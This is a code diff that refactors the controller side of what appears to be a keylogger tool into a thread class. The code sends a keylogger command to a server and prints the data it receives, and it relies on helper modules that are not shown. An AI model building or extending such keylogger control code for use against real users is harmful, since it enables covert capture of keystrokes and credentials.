@@ -1,44 +1,27 @@
 import threading
-from pynput.keyboard import Key
 import time
-from PythonSecurity.utils import *
 from config import KEYLOGGER_OPTION
+from PythonSecurity.utils import *
 
-disconnect_socket = threading.Event()
-started_keylogger = threading.Event()
+class KeyloggerThread(threading.Thread):
+    def __init__(self):
+        super().__init__()
+        self.client_socket = connect_unblocked_socket()
+        self.disconnect_socket = threading.Event()
 
-# polling socket server
-def keylogger(client_socket):
-    time.sleep(1)
-    send_malware_option(client_socket, KEYLOGGER_OPTION)
+    def run(self):
+        time.sleep(0.1)
+        send_to_server(self.client_socket, KEYLOGGER_OPTION)
 
-    while not disconnect_socket.is_set():
-        try:
-            data = receive_from_server(client_socket)
-            print(f"Received: {data}")
-        except (BlockingIOError, ConnectionResetError, BrokenPipeError):
-            pass
+        while not self.disconnect_socket.is_set():
+            try:
+                data = receive_from_server(self.client_socket)
+                print(f"Received: {data}")
+            except (BlockingIOError, ConnectionResetError, BrokenPipeError):
+                pass
 
-    print("Keylogger thread is stopping")
-    return False
-
-# kill keylogger thread when the user presses the esc key
-def on_kill(key):
-    if key == Key.esc and started_keylogger.is_set():
-        disconnect_socket.set()
-        return False  # Stop the listener
-
-def start_keylogger():
-    client_unblocked_socket = make_and_connect_unblocked_socket_to_server()
-    keylogger_thread = make_thread(keylogger, client_unblocked_socket)
-    started_keylogger.set()
-    keylogger_thread.start()
-
-    with make_keyboard_listener(on_kill) as escape_key_listener:
-        escape_key_listener.join()
-
-    keylogger_thread.join()
-
-    if disconnect_socket.is_set():
-        disconnect_socket.clear()
-        disconnect(client_unblocked_socket)  # Disconnect from the socket
+    def stop(self):
+        self.disconnect_socket.set()
+        self.join()
+        self.client_socket.close()
+        self.disconnect_socket.clear()
